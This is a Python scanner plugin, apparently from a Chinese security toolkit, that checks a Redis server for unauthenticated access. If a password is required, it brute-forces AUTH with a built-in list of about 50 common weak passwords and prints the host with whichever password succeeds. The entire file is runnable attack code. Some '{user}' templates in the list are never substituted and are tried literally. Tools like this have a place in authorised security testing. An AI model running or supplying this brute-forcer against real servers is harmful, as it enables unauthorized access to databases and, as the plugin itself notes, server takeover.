#!/usr/bin/env python3
# -*- coding:utf-8 -*-

import re
import socket

def get_plugin_info():
    plugin_info = {
        "name": "Redis 未授权/弱口令",
        "desc": "导致数据库敏感信息泄露，严重可导致服务器被入侵。",
        "grade": "高",
        "type": "service",
        "keyword": "service:redis port:6379",
    }
    return plugin_info


def poc(arg):
    check_port = lambda x:x if re.match(r"(.*?):(\d+)$",x) else x+':6379'
    host,port = check_port(arg).split(':')
    timeout = 5
    passwd_list = ["123456","admin","root","password","123123","123","1",
        "{user}","{user}{user}","{user}1","{user}123","{user}2016","{user}2015",
        "{user}!","","password01!","root@dba","P@ssw0rd!!","qwa123","root#123",
        "12345678","test","123qwe!@#","123456789","123321","1314520","666666",
        "woaini","fuckyou","000000","1234567890","8888888","qwerty","1qaz2wsx",
        "abc123","abc123456","1q2w3e4r","123qwe","159357","p@ssw0rd","p@55w0rd",
        "password!","p@ssw0rd!","password1","123qwe!@#","123QWE!@#","!@#qwe123",
        "123qwe!@#$","1qaz@WSX","r00t","tomcat","apache","system"]
    try:
        socket.setdefaulttimeout(timeout)
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((host, int(port)))
        s.send(b"INFO\r\n")
        result = s.recv(1024)
        if b"redis_version" in result:
            return True
        elif b"Authentication" in result:
            for passwd in passwd_list:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((host, int(port)))
                s.send(b"AUTH %s\r\n" % (passwd.encode()))
                result = s.recv(1024)
                if b'+OK' in result:
                    return f'{arg}\t{passwd}'
    except Exception:
        return
    
if __name__ == '__main__':
    import sys
    if len(sys.argv) != 2:
        print("{} IP[:port]".format(sys.argv[0]))
    else:
        print("{} {}".format(sys.argv[1],poc(sys.argv[1])))  
